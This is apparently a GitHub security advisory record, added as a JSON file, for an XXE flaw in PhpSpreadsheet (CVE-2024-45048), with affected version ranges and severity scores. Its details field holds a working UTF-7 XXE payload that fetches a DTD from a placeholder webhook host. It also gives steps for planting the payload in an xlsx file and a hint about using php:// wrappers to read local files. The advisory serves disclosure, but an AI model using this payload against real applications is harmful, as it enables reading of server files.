@@ -1,0 +1,208 @@
+{
+  "id": "GHSA-ghg6-32f9-2jp7",
+  "summary": "XXE in PHPSpreadsheet encoding is returned",
+  "details": "### Summary\nBypassing the filter allows a XXE-attack. Which is turn allows attacker to obtain contents of local files, even if error reporting muted by @ symbol. (LFI-attack) \n\n### Details\nCheck ` $pattern = '/encoding=\"(.*?)\"/';` easy to bypass. Just use a single quote symbol `'`. So payload looks like this:\n```\n<?xml version=\"1.0\" encoding='UTF-7' standalone=\"yes\"?>\n+ADw-!DOCTYPE xxe [+ADw-!ENTITY % xxe SYSTEM \"http://example.com/file.dtd\"> %xxe;]>\n```\nIf you add this header to any XML file into xlsx-formatted file, such as sharedStrings.xml file, then xxe will execute. \n\n### PoC\n1) Create simple xlsx file\n2) Rename xlsx to zip\n3) Go to the zip and open the `xl/sharedStrings.xml` file in edit mode.\n4) Replace `<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>` to \n```\n<?xml version=\"1.0\" encoding='UTF-7' standalone=\"yes\"?>\n+ADw-!DOCTYPE xxe [+ADw-!ENTITY % xxe SYSTEM \"http://%webhook%/file.dtd\"> %xxe;]>\n```\n5) Save `sharedStrings.xml` file and rename zip back to xlsx.\n6) Use minimal php code that simply opens this xlsx file:\n```\nuse PhpOffice\\PhpSpreadsheet\\IOFactory;\nrequire __DIR__ . '/vendor/autoload.php';\n$spreadsheet = IOFactory::load(\"file.xlsx\");\n```\n7) You will receive the request to your `http://%webhook%/file.dtd`\n8) Dont't forget that you can use php-wrappers into xxe, some php:// wrapper payload allows fetch local files.\n\n### Impact\nRead local files\n![lfi](https://github.com/PHPOffice/PhpSpreadsheet/assets/95242087/1839cddb-6bb0-486d-8884-9ac485776931)",
+  "aliases": [
+    "CVE-2024-45048"
+  ],
+  "modified": "2025-03-06T18:36:49.588031Z",
+  "published": "2024-08-29T17:58:27Z",
+  "database_specific": {
+    "nvd_published_at": "2024-08-28T21:15:06Z",
+    "cwe_ids": [
+      "CWE-611"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-08-29T17:58:27Z"
+  },
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-ghg6-32f9-2jp7"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45048"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/PHPOffice/PhpSpreadsheet/commit/bea2d4b30f24bcc8a7712e208d1359e603b45dda"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/PHPOffice/PhpSpreadsheet"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "name": "phpoffice/phpspreadsheet",
+        "ecosystem": "Packagist",
+        "purl": "pkg:composer/phpoffice/phpspreadsheet"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.29.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.0.0",
+        "1.0.0-beta",
+        "1.0.0-beta2",
+        "1.1.0",
+        "1.10.0",
+        "1.10.1",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.17.0",
+        "1.17.1",
+        "1.18.0",
+        "1.19.0",
+        "1.2.0",
+        "1.2.1",
+        "1.20.0",
+        "1.21.0",
+        "1.22.0",
+        "1.23.0",
+        "1.24.0",
+        "1.24.1",
+        "1.25.0",
+        "1.25.1",
+        "1.25.2",
+        "1.26.0",
+        "1.27.0",
+        "1.27.1",
+        "1.28.0",
+        "1.29.0",
+        "1.3.0",
+        "1.3.1",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.5.1",
+        "1.5.2",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.8.2",
+        "1.9.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-ghg6-32f9-2jp7/GHSA-ghg6-32f9-2jp7.json"
+      }
+    },
+    {
+      "package": {
+        "name": "phpoffice/phpspreadsheet",
+        "ecosystem": "Packagist",
+        "purl": "pkg:composer/phpoffice/phpspreadsheet"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.2.0"
+            },
+            {
+              "fixed": "2.2.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "2.2.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-ghg6-32f9-2jp7/GHSA-ghg6-32f9-2jp7.json"
+      }
+    },
+    {
+      "package": {
+        "name": "phpoffice/phpspreadsheet",
+        "ecosystem": "Packagist",
+        "purl": "pkg:composer/phpoffice/phpspreadsheet"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.0.0"
+            },
+            {
+              "fixed": "2.1.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "2.0.0",
+        "2.1.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-ghg6-32f9-2jp7/GHSA-ghg6-32f9-2jp7.json"
+      }
+    },
+    {
+      "package": {
+        "name": "phpoffice/phpexcel",
+        "ecosystem": "Packagist",
+        "purl": "pkg:composer/phpoffice/phpexcel"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.8.2"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.7.9",
+        "1.7.9-rc1",
+        "1.8.0",
+        "1.8.0rc1",
+        "1.8.0rc2",
+        "1.8.0rc3",
+        "1.8.0rc4",
+        "1.8.1",
+        "1.8.2"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-ghg6-32f9-2jp7/GHSA-ghg6-32f9-2jp7.json"
+      }
+    }
+  ],
+  "schema_version": "1.6.0",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+    }
+  ]
+}
